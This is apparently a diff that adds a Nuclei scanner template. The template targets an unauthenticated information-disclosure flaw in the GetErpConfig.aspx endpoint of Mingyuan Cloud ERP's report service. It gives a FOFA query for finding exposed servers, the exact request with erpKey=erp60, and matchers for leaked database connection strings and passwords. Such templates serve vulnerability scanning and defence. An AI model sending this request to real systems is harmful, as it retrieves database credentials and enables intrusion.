@@ -1,0 +1,31 @@
+id: mingyuanyunERP-GetErpConfig_aspx-Information-disclosure
+
+info:
+  tags: mingyuanyunERP-GetErpConfig_aspx-Information-disclosure
+  name: 明源云ERP报表服务 GetErpConfig.aspx 信息泄露漏洞
+  author: xc
+  severity: medium
+  description: |-
+    fofa: body="报表服务已正常运行"
+    明源云ERP报表服务 GetErpConfig.aspx 接口存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取内部数据库敏感配置信息，导致系统处于极不安全的状态。
+
+http:
+  - raw:
+      - |
+        GET /service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"Data Source='
+          - 'ID='
+          - 'Password='
+          - '"ConnectionString":'
+        condition: and
+      - type: status
+        status: 
+          - 200
